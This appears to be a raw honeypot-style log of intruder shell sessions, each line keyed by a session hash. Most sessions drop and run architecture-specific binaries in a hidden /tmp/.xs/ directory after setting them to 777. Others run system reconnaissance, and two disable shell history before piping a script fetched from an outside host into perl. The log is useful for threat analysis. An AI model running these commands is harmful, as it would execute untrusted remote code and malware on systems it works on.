ba3e9fb9906a4253b35546515acd140a	cat  > /tmp/.xs/daemon.armv4l.mod
ba3e9fb9906a4253b35546515acd140a	chmod 777 /tmp/.xs/daemon.armv4l.mod
ba3e9fb9906a4253b35546515acd140a	/tmp/.xs/daemon.armv4l.mod
dc2bd9d51f954dfaab92dfa35cc55b6e	mkdir /tmp/.xs/
dc2bd9d51f954dfaab92dfa35cc55b6e	cat  > /tmp/.xs/daemon.i686.mod
dc2bd9d51f954dfaab92dfa35cc55b6e	chmod 777 /tmp/.xs/daemon.i686.mod
dc2bd9d51f954dfaab92dfa35cc55b6e	/tmp/.xs/daemon.i686.mod
1cfe5eeceba44b4c8ea55186d0257d43	mkdir /tmp/.xs/
1cfe5eeceba44b4c8ea55186d0257d43	cat  > /tmp/.xs/daemon.mips.mod
1cfe5eeceba44b4c8ea55186d0257d43	chmod 777 /tmp/.xs/daemon.mips.mod
1cfe5eeceba44b4c8ea55186d0257d43	/tmp/.xs/daemon.mips.mod
cc499bf7d91f4bbcaea42a41f8840fe3	mkdir /tmp/.xs/
cc499bf7d91f4bbcaea42a41f8840fe3	cat  > /tmp/.xs/daemon.mipsel.mod
cc499bf7d91f4bbcaea42a41f8840fe3	chmod 777 /tmp/.xs/daemon.mipsel.mod
cc499bf7d91f4bbcaea42a41f8840fe3	/tmp/.xs/daemon.mipsel.mod
98b63c2fce04480f89198eb4cdb4d954	mkdir /tmp/.xs/
98b63c2fce04480f89198eb4cdb4d954	cat  > /tmp/.xs/test.mod
98b63c2fce04480f89198eb4cdb4d954	chmod 777 /tmp/.xs/test.mod
98b63c2fce04480f89198eb4cdb4d954	/tmp/.xs/test.mod
6371ec577fc94662a58d6546f73e221a	echo -n test
6371ec577fc94662a58d6546f73e221a	cat /proc/version
aec92ddfe5934af3bde34a9f349441a5	mkdir /tmp/.xs/
aec92ddfe5934af3bde34a9f349441a5	cat  > /tmp/.xs/daemon.armv4l.mod
aec92ddfe5934af3bde34a9f349441a5	chmod 777 /tmp/.xs/daemon.armv4l.mod
aec92ddfe5934af3bde34a9f349441a5	/tmp/.xs/daemon.armv4l.mod
2abf4df24fd247eebc096076c3753c51	mkdir /tmp/.xs/
2abf4df24fd247eebc096076c3753c51	cat  > /tmp/.xs/daemon.i686.mod
2abf4df24fd247eebc096076c3753c51	chmod 777 /tmp/.xs/daemon.i686.mod
2abf4df24fd247eebc096076c3753c51	/tmp/.xs/daemon.i686.mod
034e198a9f924333ac64d28041ce711c	mkdir /tmp/.xs/
034e198a9f924333ac64d28041ce711c	cat  > /tmp/.xs/daemon.mips.mod
034e198a9f924333ac64d28041ce711c	chmod 777 /tmp/.xs/daemon.mips.mod
034e198a9f924333ac64d28041ce711c	/tmp/.xs/daemon.mips.mod
d55ebb3630bb4b0da3009b030dca659c	echo -n test
d55ebb3630bb4b0da3009b030dca659c	cat /proc/version
f06f9ccfc5a44b358aa384751763563f	mkdir /tmp/.xs/
f06f9ccfc5a44b358aa384751763563f	cat  > /tmp/.xs/daemon.armv4l.mod
f06f9ccfc5a44b358aa384751763563f	chmod 777 /tmp/.xs/daemon.armv4l.mod
f06f9ccfc5a44b358aa384751763563f	/tmp/.xs/daemon.armv4l.mod
24b688ca01e74ec3889f85fad8ad2b94	mkdir /tmp/.xs/
24b688ca01e74ec3889f85fad8ad2b94	cat  > /tmp/.xs/daemon.i686.mod
e1e69110e822417e961c47411b6e116f	mkdir /tmp/.xs/
e1e69110e822417e961c47411b6e116f	cat  > /tmp/.xs/daemon.armv4l.mod
e1e69110e822417e961c47411b6e116f	chmod 777 /tmp/.xs/daemon.armv4l.mod
e1e69110e822417e961c47411b6e116f	/tmp/.xs/daemon.armv4l.mod
15c848341d3c4470b59006673ba8abf5	mkdir /tmp/.xs/
15c848341d3c4470b59006673ba8abf5	cat  > /tmp/.xs/daemon.i686.mod
15c848341d3c4470b59006673ba8abf5	chmod 777 /tmp/.xs/daemon.i686.mod
15c848341d3c4470b59006673ba8abf5	/tmp/.xs/daemon.i686.mod
d4a4213fdda94679a1deb3cae0019add	mkdir /tmp/.xs/
d4a4213fdda94679a1deb3cae0019add	cat  > /tmp/.xs/daemon.mips.mod
d4a4213fdda94679a1deb3cae0019add	chmod 777 /tmp/.xs/daemon.mips.mod
d4a4213fdda94679a1deb3cae0019add	/tmp/.xs/daemon.mips.mod
51c42611c89e430bb5470976f2fab2cd	mkdir /tmp/.xs/
51c42611c89e430bb5470976f2fab2cd	cat  > /tmp/.xs/daemon.armv4l.mod
51c42611c89e430bb5470976f2fab2cd	chmod 777 /tmp/.xs/daemon.armv4l.mod
51c42611c89e430bb5470976f2fab2cd	/tmp/.xs/daemon.armv4l.mod
3c6d6f05739d41168bc3374b150faa81	mkdir /tmp/.xs/
3c6d6f05739d41168bc3374b150faa81	cat  > /tmp/.xs/daemon.i686.mod
3c6d6f05739d41168bc3374b150faa81	chmod 777 /tmp/.xs/daemon.i686.mod
3c6d6f05739d41168bc3374b150faa81	/tmp/.xs/daemon.i686.mod
aea38d3c20784cb7a89a347103d6a686	mkdir /tmp/.xs/
aea38d3c20784cb7a89a347103d6a686	cat  > /tmp/.xs/daemon.mips.mod
aea38d3c20784cb7a89a347103d6a686	chmod 777 /tmp/.xs/daemon.mips.mod
aea38d3c20784cb7a89a347103d6a686	/tmp/.xs/daemon.mips.mod
78745b42a5c544f29ac5ef4affc10f37	mkdir /tmp/.xs/
78745b42a5c544f29ac5ef4affc10f37	cat  > /tmp/.xs/daemon.armv4l.mod
78745b42a5c544f29ac5ef4affc10f37	chmod 777 /tmp/.xs/daemon.armv4l.mod
78745b42a5c544f29ac5ef4affc10f37	/tmp/.xs/daemon.armv4l.mod
0c54fff2b4ce459a817511edf44043e0	mkdir /tmp/.xs/
0c54fff2b4ce459a817511edf44043e0	cat  > /tmp/.xs/daemon.i686.mod
0c54fff2b4ce459a817511edf44043e0	chmod 777 /tmp/.xs/daemon.i686.mod
0c54fff2b4ce459a817511edf44043e0	/tmp/.xs/daemon.i686.mod
d6e1807037fd45bb97241cfbdf69fdb8	mkdir /tmp/.xs/
d6e1807037fd45bb97241cfbdf69fdb8	cat  > /tmp/.xs/daemon.mips.mod
d6e1807037fd45bb97241cfbdf69fdb8	chmod 777 /tmp/.xs/daemon.mips.mod
d6e1807037fd45bb97241cfbdf69fdb8	/tmp/.xs/daemon.mips.mod
f264bf43670148ca9f3cfb66136b0a3c	mkdir /tmp/.xs/
f264bf43670148ca9f3cfb66136b0a3c	cat  > /tmp/.xs/daemon.armv4l.mod
f264bf43670148ca9f3cfb66136b0a3c	chmod 777 /tmp/.xs/daemon.armv4l.mod
f264bf43670148ca9f3cfb66136b0a3c	/tmp/.xs/daemon.armv4l.mod
97f22641bafa40c3aefde46f0d06fdd2	mkdir /tmp/.xs/
97f22641bafa40c3aefde46f0d06fdd2	cat  > /tmp/.xs/daemon.i686.mod
97f22641bafa40c3aefde46f0d06fdd2	chmod 777 /tmp/.xs/daemon.i686.mod
97f22641bafa40c3aefde46f0d06fdd2	/tmp/.xs/daemon.i686.mod
fce4946872ff4252b8f0868358e97ee6	mkdir /tmp/.xs/
fce4946872ff4252b8f0868358e97ee6	cat  > /tmp/.xs/daemon.mips.mod
fce4946872ff4252b8f0868358e97ee6	chmod 777 /tmp/.xs/daemon.mips.mod
fce4946872ff4252b8f0868358e97ee6	/tmp/.xs/daemon.mips.mod
3d925a40208743e5aff7c1ff7d821df3	mkdir /tmp/.xs/
3d925a40208743e5aff7c1ff7d821df3	cat  > /tmp/.xs/daemon.armv4l.mod
3d925a40208743e5aff7c1ff7d821df3	chmod 777 /tmp/.xs/daemon.armv4l.mod
3d925a40208743e5aff7c1ff7d821df3	/tmp/.xs/daemon.armv4l.mod
8c77ee79ba504491a28720c5a8b5cd4e	mkdir /tmp/.xs/
8c77ee79ba504491a28720c5a8b5cd4e	cat  > /tmp/.xs/daemon.i686.mod
8c77ee79ba504491a28720c5a8b5cd4e	chmod 777 /tmp/.xs/daemon.i686.mod
8c77ee79ba504491a28720c5a8b5cd4e	/tmp/.xs/daemon.i686.mod
d41aeda74ab54e1ebc3ecf03512644fa	mkdir /tmp/.xs/
d41aeda74ab54e1ebc3ecf03512644fa	cat  > /tmp/.xs/daemon.mips.mod
d41aeda74ab54e1ebc3ecf03512644fa	chmod 777 /tmp/.xs/daemon.mips.mod
d41aeda74ab54e1ebc3ecf03512644fa	/tmp/.xs/daemon.mips.mod
7861edc483b844d895a98233a35e6f6d	mkdir /tmp/.xs/
7861edc483b844d895a98233a35e6f6d	cat  > /tmp/.xs/daemon.armv4l.mod
7861edc483b844d895a98233a35e6f6d	chmod 777 /tmp/.xs/daemon.armv4l.mod
7861edc483b844d895a98233a35e6f6d	/tmp/.xs/daemon.armv4l.mod
f6789abf2d0a4d4b90fd4453a690accc	mkdir /tmp/.xs/
f6789abf2d0a4d4b90fd4453a690accc	cat  > /tmp/.xs/daemon.i686.mod
f6789abf2d0a4d4b90fd4453a690accc	chmod 777 /tmp/.xs/daemon.i686.mod
f6789abf2d0a4d4b90fd4453a690accc	/tmp/.xs/daemon.i686.mod
91129aa079ba47f49ae0ea66cb7b9263	mkdir /tmp/.xs/
91129aa079ba47f49ae0ea66cb7b9263	cat  > /tmp/.xs/daemon.mips.mod
91129aa079ba47f49ae0ea66cb7b9263	chmod 777 /tmp/.xs/daemon.mips.mod
91129aa079ba47f49ae0ea66cb7b9263	/tmp/.xs/daemon.mips.mod
cb19d0d8b356446d8ff0fdb8bc5dc3d8	mkdir /tmp/.xs/
cb19d0d8b356446d8ff0fdb8bc5dc3d8	cat  > /tmp/.xs/daemon.armv4l.mod
cb19d0d8b356446d8ff0fdb8bc5dc3d8	chmod 777 /tmp/.xs/daemon.armv4l.mod
cb19d0d8b356446d8ff0fdb8bc5dc3d8	/tmp/.xs/daemon.armv4l.mod
36a18f8ea43048f5afab9c87d25b81c7	mkdir /tmp/.xs/
36a18f8ea43048f5afab9c87d25b81c7	cat  > /tmp/.xs/daemon.i686.mod
36a18f8ea43048f5afab9c87d25b81c7	chmod 777 /tmp/.xs/daemon.i686.mod
36a18f8ea43048f5afab9c87d25b81c7	/tmp/.xs/daemon.i686.mod
51aa16da513640a79451c975fe15ba0f	mkdir /tmp/.xs/
51aa16da513640a79451c975fe15ba0f	cat  > /tmp/.xs/daemon.mips.mod
51aa16da513640a79451c975fe15ba0f	chmod 777 /tmp/.xs/daemon.mips.mod
51aa16da513640a79451c975fe15ba0f	/tmp/.xs/daemon.mips.mod
eaad990e270e413f9b95d150189e61ca	mkdir /tmp/.xs/
eaad990e270e413f9b95d150189e61ca	cat  > /tmp/.xs/daemon.armv4l.mod
eaad990e270e413f9b95d150189e61ca	chmod 777 /tmp/.xs/daemon.armv4l.mod
eaad990e270e413f9b95d150189e61ca	/tmp/.xs/daemon.armv4l.mod
2cead4227e2c4d6195ef03ff9128363d	mkdir /tmp/.xs/
2cead4227e2c4d6195ef03ff9128363d	cat  > /tmp/.xs/daemon.i686.mod
2cead4227e2c4d6195ef03ff9128363d	chmod 777 /tmp/.xs/daemon.i686.mod
2cead4227e2c4d6195ef03ff9128363d	/tmp/.xs/daemon.i686.mod
40eb9d6c658d4f07aad102fd9869760c	mkdir /tmp/.xs/
40eb9d6c658d4f07aad102fd9869760c	cat  > /tmp/.xs/daemon.mips.mod
40eb9d6c658d4f07aad102fd9869760c	chmod 777 /tmp/.xs/daemon.mips.mod
40eb9d6c658d4f07aad102fd9869760c	/tmp/.xs/daemon.mips.mod
77ae8b81a3374ea2a624c7325ee29cd8	mkdir /tmp/.xs/
77ae8b81a3374ea2a624c7325ee29cd8	cat  > /tmp/.xs/daemon.armv4l.mod
77ae8b81a3374ea2a624c7325ee29cd8	chmod 777 /tmp/.xs/daemon.armv4l.mod
77ae8b81a3374ea2a624c7325ee29cd8	/tmp/.xs/daemon.armv4l.mod
be6003af97304a88adbf10451c95bccb	mkdir /tmp/.xs/
be6003af97304a88adbf10451c95bccb	cat  > /tmp/.xs/daemon.i686.mod
be6003af97304a88adbf10451c95bccb	chmod 777 /tmp/.xs/daemon.i686.mod
be6003af97304a88adbf10451c95bccb	/tmp/.xs/daemon.i686.mod
22eecd307d1e4468abf8524881f42f30	mkdir /tmp/.xs/
22eecd307d1e4468abf8524881f42f30	cat  > /tmp/.xs/daemon.mips.mod
22eecd307d1e4468abf8524881f42f30	chmod 777 /tmp/.xs/daemon.mips.mod
22eecd307d1e4468abf8524881f42f30	/tmp/.xs/daemon.mips.mod
71f85242b1794029964ea7ddd044c120	mkdir /tmp/.xs/
71f85242b1794029964ea7ddd044c120	cat  > /tmp/.xs/daemon.armv4l.mod
71f85242b1794029964ea7ddd044c120	chmod 777 /tmp/.xs/daemon.armv4l.mod
71f85242b1794029964ea7ddd044c120	/tmp/.xs/daemon.armv4l.mod
be2863317eaf4104aaa7622d9d71c023	mkdir /tmp/.xs/
be2863317eaf4104aaa7622d9d71c023	cat  > /tmp/.xs/daemon.i686.mod
be2863317eaf4104aaa7622d9d71c023	chmod 777 /tmp/.xs/daemon.i686.mod
be2863317eaf4104aaa7622d9d71c023	/tmp/.xs/daemon.i686.mod
6d7a8a3e8b6944828ce9cfe7bb5ce022	mkdir /tmp/.xs/
6d7a8a3e8b6944828ce9cfe7bb5ce022	cat  > /tmp/.xs/daemon.mips.mod
6d7a8a3e8b6944828ce9cfe7bb5ce022	chmod 777 /tmp/.xs/daemon.mips.mod
6d7a8a3e8b6944828ce9cfe7bb5ce022	/tmp/.xs/daemon.mips.mod
195cf56a465b42f0ab9b69c62d41dc75	echo -n test
195cf56a465b42f0ab9b69c62d41dc75	cat /proc/version
9c147facf8bd4624a2dbd69d26de4781	mkdir /tmp/.xs/
9c147facf8bd4624a2dbd69d26de4781	cat  > /tmp/.xs/daemon.armv4l.mod
9c147facf8bd4624a2dbd69d26de4781	chmod 777 /tmp/.xs/daemon.armv4l.mod
9c147facf8bd4624a2dbd69d26de4781	/tmp/.xs/daemon.armv4l.mod
7813333203ac406282f1d807450d8e65	mkdir /tmp/.xs/
7813333203ac406282f1d807450d8e65	cat  > /tmp/.xs/daemon.i686.mod
7813333203ac406282f1d807450d8e65	chmod 777 /tmp/.xs/daemon.i686.mod
7813333203ac406282f1d807450d8e65	/tmp/.xs/daemon.i686.mod
2156e48ac88543939180fa4022ea45a8	mkdir /tmp/.xs/
2156e48ac88543939180fa4022ea45a8	cat  > /tmp/.xs/daemon.mips.mod
2156e48ac88543939180fa4022ea45a8	chmod 777 /tmp/.xs/daemon.mips.mod
2156e48ac88543939180fa4022ea45a8	/tmp/.xs/daemon.mips.mod
3ae3a653202841e29aecb4a1b381cb65	mkdir /tmp/.xs/
3ae3a653202841e29aecb4a1b381cb65	cat  > /tmp/.xs/daemon.mipsel.mod
3ae3a653202841e29aecb4a1b381cb65	chmod 777 /tmp/.xs/daemon.mipsel.mod
3ae3a653202841e29aecb4a1b381cb65	/tmp/.xs/daemon.mipsel.mod
31e1347455a0409c9f9b4e9e17e226ef	mkdir /tmp/.xs/
31e1347455a0409c9f9b4e9e17e226ef	cat  > /tmp/.xs/test.mod
31e1347455a0409c9f9b4e9e17e226ef	chmod 777 /tmp/.xs/test.mod
31e1347455a0409c9f9b4e9e17e226ef	/tmp/.xs/test.mod
0bb1dcda42ba42deb972dd02fc20c7fb	mkdir /tmp/.xs/
0bb1dcda42ba42deb972dd02fc20c7fb	cat  > /tmp/.xs/daemon.armv4l.mod
0bb1dcda42ba42deb972dd02fc20c7fb	chmod 777 /tmp/.xs/daemon.armv4l.mod
0bb1dcda42ba42deb972dd02fc20c7fb	/tmp/.xs/daemon.armv4l.mod
d624f8d481ed46a7a09eb73d8132d568	mkdir /tmp/.xs/
d624f8d481ed46a7a09eb73d8132d568	cat  > /tmp/.xs/daemon.i686.mod
d624f8d481ed46a7a09eb73d8132d568	chmod 777 /tmp/.xs/daemon.i686.mod
d624f8d481ed46a7a09eb73d8132d568	/tmp/.xs/daemon.i686.mod
04ea22a7df764272a9e33935e520ceda	mkdir /tmp/.xs/
04ea22a7df764272a9e33935e520ceda	cat  > /tmp/.xs/daemon.mips.mod
04ea22a7df764272a9e33935e520ceda	chmod 777 /tmp/.xs/daemon.mips.mod
04ea22a7df764272a9e33935e520ceda	/tmp/.xs/daemon.mips.mod
ae8edee1f46247d981faae8773fa32a8	mkdir /tmp/.xs/
ae8edee1f46247d981faae8773fa32a8	cat  > /tmp/.xs/daemon.mipsel.mod
ae8edee1f46247d981faae8773fa32a8	chmod 777 /tmp/.xs/daemon.mipsel.mod
ae8edee1f46247d981faae8773fa32a8	/tmp/.xs/daemon.mipsel.mod
8184a971ed3a4e019706b0e593e1d54e	mkdir /tmp/.xs/
8184a971ed3a4e019706b0e593e1d54e	cat  > /tmp/.xs/test.mod
8184a971ed3a4e019706b0e593e1d54e	chmod 777 /tmp/.xs/test.mod
8184a971ed3a4e019706b0e593e1d54e	/tmp/.xs/test.mod
431f16f544d9462fb7afa7ac6fba8611	mkdir /tmp/.xs/
431f16f544d9462fb7afa7ac6fba8611	cat  > /tmp/.xs/daemon.armv4l.mod
431f16f544d9462fb7afa7ac6fba8611	chmod 777 /tmp/.xs/daemon.armv4l.mod
431f16f544d9462fb7afa7ac6fba8611	/tmp/.xs/daemon.armv4l.mod
b4fd031d9d904a9193135e6b12e536de	mkdir /tmp/.xs/
b4fd031d9d904a9193135e6b12e536de	cat  > /tmp/.xs/daemon.i686.mod
b4fd031d9d904a9193135e6b12e536de	chmod 777 /tmp/.xs/daemon.i686.mod
b4fd031d9d904a9193135e6b12e536de	/tmp/.xs/daemon.i686.mod
6cd64f23feee4b1db97db65adcddcae8	mkdir /tmp/.xs/
6cd64f23feee4b1db97db65adcddcae8	cat  > /tmp/.xs/daemon.mips.mod
6cd64f23feee4b1db97db65adcddcae8	chmod 777 /tmp/.xs/daemon.mips.mod
6cd64f23feee4b1db97db65adcddcae8	/tmp/.xs/daemon.mips.mod
420b41e059584771b3f784801e49b7db	mkdir /tmp/.xs/
420b41e059584771b3f784801e49b7db	cat  > /tmp/.xs/daemon.mipsel.mod
420b41e059584771b3f784801e49b7db	chmod 777 /tmp/.xs/daemon.mipsel.mod
420b41e059584771b3f784801e49b7db	/tmp/.xs/daemon.mipsel.mod
9ebfdf6d4a3e4973a70b1bd1d5e5d19d	mkdir /tmp/.xs/
9ebfdf6d4a3e4973a70b1bd1d5e5d19d	cat  > /tmp/.xs/test.mod
9ebfdf6d4a3e4973a70b1bd1d5e5d19d	chmod 777 /tmp/.xs/test.mod
9ebfdf6d4a3e4973a70b1bd1d5e5d19d	/tmp/.xs/test.mod
55000aaa0a8045caa8141b7127ec5a8f	uname
55000aaa0a8045caa8141b7127ec5a8f	free -m
55000aaa0a8045caa8141b7127ec5a8f	ps x
68753988c8714f47b1ecb0bf7afd29fb	uname
68753988c8714f47b1ecb0bf7afd29fb	free -m
68753988c8714f47b1ecb0bf7afd29fb	ps x
65272c16cd394a8b8f09279c706d92c4	mkdir /tmp/.xs/
65272c16cd394a8b8f09279c706d92c4	cat  > /tmp/.xs/daemon.armv4l.mod
65272c16cd394a8b8f09279c706d92c4	chmod 777 /tmp/.xs/daemon.armv4l.mod
65272c16cd394a8b8f09279c706d92c4	/tmp/.xs/daemon.armv4l.mod
faec78a99c3f41bd9ed8b9e42c57bb46	mkdir /tmp/.xs/
faec78a99c3f41bd9ed8b9e42c57bb46	cat  > /tmp/.xs/daemon.i686.mod
faec78a99c3f41bd9ed8b9e42c57bb46	chmod 777 /tmp/.xs/daemon.i686.mod
faec78a99c3f41bd9ed8b9e42c57bb46	/tmp/.xs/daemon.i686.mod
361550ddfbd8479b96541de6d6364d7e	mkdir /tmp/.xs/
361550ddfbd8479b96541de6d6364d7e	cat  > /tmp/.xs/daemon.mips.mod
361550ddfbd8479b96541de6d6364d7e	chmod 777 /tmp/.xs/daemon.mips.mod
361550ddfbd8479b96541de6d6364d7e	/tmp/.xs/daemon.mips.mod
7bca465f669a4e50b16de703cb04ae5d	mkdir /tmp/.xs/
7bca465f669a4e50b16de703cb04ae5d	cat  > /tmp/.xs/daemon.mipsel.mod
7bca465f669a4e50b16de703cb04ae5d	chmod 777 /tmp/.xs/daemon.mipsel.mod
7bca465f669a4e50b16de703cb04ae5d	/tmp/.xs/daemon.mipsel.mod
55793c22ec41496a9d43ec882a847be7	mkdir /tmp/.xs/
55793c22ec41496a9d43ec882a847be7	cat  > /tmp/.xs/test.mod
55793c22ec41496a9d43ec882a847be7	chmod 777 /tmp/.xs/test.mod
55793c22ec41496a9d43ec882a847be7	/tmp/.xs/test.mod
71774b05b7c24384a79ff740e5e24c4d	mkdir /tmp/.xs/
71774b05b7c24384a79ff740e5e24c4d	cat  > /tmp/.xs/daemon.armv4l.mod
71774b05b7c24384a79ff740e5e24c4d	chmod 777 /tmp/.xs/daemon.armv4l.mod
71774b05b7c24384a79ff740e5e24c4d	/tmp/.xs/daemon.armv4l.mod
8bc7389169e348ac9cccae4f9a2f3392	mkdir /tmp/.xs/
8bc7389169e348ac9cccae4f9a2f3392	cat  > /tmp/.xs/daemon.i686.mod
8bc7389169e348ac9cccae4f9a2f3392	chmod 777 /tmp/.xs/daemon.i686.mod
8bc7389169e348ac9cccae4f9a2f3392	/tmp/.xs/daemon.i686.mod
9c3350745abe47c98160b7028d561abd	mkdir /tmp/.xs/
9c3350745abe47c98160b7028d561abd	cat  > /tmp/.xs/daemon.mips.mod
9c3350745abe47c98160b7028d561abd	chmod 777 /tmp/.xs/daemon.mips.mod
9c3350745abe47c98160b7028d561abd	/tmp/.xs/daemon.mips.mod
688edb6e9aa640d285ed59354f97ac85	mkdir /tmp/.xs/
688edb6e9aa640d285ed59354f97ac85	cat  > /tmp/.xs/daemon.mipsel.mod
688edb6e9aa640d285ed59354f97ac85	chmod 777 /tmp/.xs/daemon.mipsel.mod
688edb6e9aa640d285ed59354f97ac85	/tmp/.xs/daemon.mipsel.mod
2462f00420c449b29e6ddd1483f347d0	mkdir /tmp/.xs/
2462f00420c449b29e6ddd1483f347d0	cat  > /tmp/.xs/test.mod
2462f00420c449b29e6ddd1483f347d0	chmod 777 /tmp/.xs/test.mod
2462f00420c449b29e6ddd1483f347d0	/tmp/.xs/test.mod
fee1cc3809a9498aa9fdf585e17d861e	uname
fee1cc3809a9498aa9fdf585e17d861e	free -m
fee1cc3809a9498aa9fdf585e17d861e	ps x
ec7afdfae7c243f0a05308cceb325e2f	uname
ec7afdfae7c243f0a05308cceb325e2f	free -m
ec7afdfae7c243f0a05308cceb325e2f	ps x
7377bdf12904438b9cb3c6df266c7be3	uname
7377bdf12904438b9cb3c6df266c7be3	free -m
7377bdf12904438b9cb3c6df266c7be3	ps x
4ee51017bedd4ff78929e61b53bdaa90	uname
4ee51017bedd4ff78929e61b53bdaa90	free -m
4ee51017bedd4ff78929e61b53bdaa90	ps x
f09fec644ee24f9b853cc98613845367	uname
f09fec644ee24f9b853cc98613845367	free -m
f09fec644ee24f9b853cc98613845367	ps x
4a383b6ce80e4141835d6785970fd42e	uname
4a383b6ce80e4141835d6785970fd42e	free -m
4a383b6ce80e4141835d6785970fd42e	ps x
d8bc7f6aeb204f4d9edb95e96ba52888	uname
d8bc7f6aeb204f4d9edb95e96ba52888	free -m
d8bc7f6aeb204f4d9edb95e96ba52888	ps x
f639b1602bc545adae70fa1895f6591c	uname
f639b1602bc545adae70fa1895f6591c	free -m
f639b1602bc545adae70fa1895f6591c	ps x
960e95bd0f4b409f909d3061fd0569e3	uname
960e95bd0f4b409f909d3061fd0569e3	free -m
960e95bd0f4b409f909d3061fd0569e3	ps x
850312b03bb54543ac90de20265f8e65	uname
850312b03bb54543ac90de20265f8e65	free -m
850312b03bb54543ac90de20265f8e65	ps x
2a0decf66a7945cebae51e06295bd280	uname
2a0decf66a7945cebae51e06295bd280	free -m
2a0decf66a7945cebae51e06295bd280	ps x
baf5c7c44d53467999a5f0099c15d32f	uname
baf5c7c44d53467999a5f0099c15d32f	free -m
baf5c7c44d53467999a5f0099c15d32f	ps x
6918e9504f164538bc18a846c7dce5e9	uname
6918e9504f164538bc18a846c7dce5e9	free -m
6918e9504f164538bc18a846c7dce5e9	ps x
13069672087d41b58d1f0911c0c9ebb8	uname
13069672087d41b58d1f0911c0c9ebb8	free -m
13069672087d41b58d1f0911c0c9ebb8	ps x
7c74df989d1b4f66bcd3f674ca11d4af	uname
7c74df989d1b4f66bcd3f674ca11d4af	free -m
7c74df989d1b4f66bcd3f674ca11d4af	ps x
77986feb3e354925a98986198a379c3a	uname
77986feb3e354925a98986198a379c3a	free -m
77986feb3e354925a98986198a379c3a	ps x
9d9210eb7cb746e0bfca243821531198	uname
9d9210eb7cb746e0bfca243821531198	free -m
9d9210eb7cb746e0bfca243821531198	ps x
04d07c3edae54feebe273253b436a73c	mkdir /tmp/.xs/
04d07c3edae54feebe273253b436a73c	cat  > /tmp/.xs/daemon.armv4l.mod
04d07c3edae54feebe273253b436a73c	chmod 777 /tmp/.xs/daemon.armv4l.mod
04d07c3edae54feebe273253b436a73c	/tmp/.xs/daemon.armv4l.mod
288a4d2318fa44bfaa950a9c328cd592	mkdir /tmp/.xs/
288a4d2318fa44bfaa950a9c328cd592	cat  > /tmp/.xs/daemon.i686.mod
288a4d2318fa44bfaa950a9c328cd592	chmod 777 /tmp/.xs/daemon.i686.mod
288a4d2318fa44bfaa950a9c328cd592	/tmp/.xs/daemon.i686.mod
78df3d82d4fd4eeb9b8785f764d98091	mkdir /tmp/.xs/
78df3d82d4fd4eeb9b8785f764d98091	cat  > /tmp/.xs/daemon.mips.mod
78df3d82d4fd4eeb9b8785f764d98091	chmod 777 /tmp/.xs/daemon.mips.mod
78df3d82d4fd4eeb9b8785f764d98091	/tmp/.xs/daemon.mips.mod
0bd736ab77bc41de905ce34dc053a0b2	mkdir /tmp/.xs/
0bd736ab77bc41de905ce34dc053a0b2	cat  > /tmp/.xs/daemon.mipsel.mod
0bd736ab77bc41de905ce34dc053a0b2	chmod 777 /tmp/.xs/daemon.mipsel.mod
0bd736ab77bc41de905ce34dc053a0b2	/tmp/.xs/daemon.mipsel.mod
47da0e03dfee42a1b2258184eca402a3	mkdir /tmp/.xs/
47da0e03dfee42a1b2258184eca402a3	cat  > /tmp/.xs/test.mod
47da0e03dfee42a1b2258184eca402a3	chmod 777 /tmp/.xs/test.mod
47da0e03dfee42a1b2258184eca402a3	/tmp/.xs/test.mod
356c7743266140bda5342e297599090c	set +o history
356c7743266140bda5342e297599090c	wget -qO - http://musti.be/lul  |  perl
720553cca8ff4cbbb937d2800323d5de	set +o history
720553cca8ff4cbbb937d2800323d5de	wget -qO - http://musti.be/lul  |  perl
356c7743266140bda5342e297599090c	exit
720553cca8ff4cbbb937d2800323d5de	exit
ab07ed1bd658406db1cf6817f73fa2f7	mkdir /tmp/.xs/
ab07ed1bd658406db1cf6817f73fa2f7	cat  > /tmp/.xs/daemon.armv4l.mod
ab07ed1bd658406db1cf6817f73fa2f7	chmod 777 /tmp/.xs/daemon.armv4l.mod
ab07ed1bd658406db1cf6817f73fa2f7	/tmp/.xs/daemon.armv4l.mod
b39a396a623e410e85472a9d43e233ba	mkdir /tmp/.xs/
b39a396a623e410e85472a9d43e233ba	cat  > /tmp/.xs/daemon.i686.mod
b39a396a623e410e85472a9d43e233ba	chmod 777 /tmp/.xs/daemon.i686.mod
b39a396a623e410e85472a9d43e233ba	/tmp/.xs/daemon.i686.mod
0a1b53e7514546f7838d19e9e6275b3a	mkdir /tmp/.xs/
0a1b53e7514546f7838d19e9e6275b3a	cat  > /tmp/.xs/daemon.mips.mod
0a1b53e7514546f7838d19e9e6275b3a	chmod 777 /tmp/.xs/daemon.mips.mod
